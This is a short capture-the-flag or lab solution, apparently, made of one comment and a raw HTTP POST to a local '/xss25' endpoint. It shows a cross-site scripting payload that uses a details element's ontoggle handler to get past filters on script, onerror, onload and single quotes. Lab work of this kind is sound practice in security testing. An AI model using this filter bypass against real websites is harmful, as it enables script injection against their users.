# XSS bypass using ontoggle event handler on details element. Filters block script, onerror, onload, and single quotes but ontoggle with double quotes bypasses all filters.

POST /xss25 HTTP/1.1
Host: 172.17.0.1:38325
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

solution=<details open ontoggle=alert("XSS")>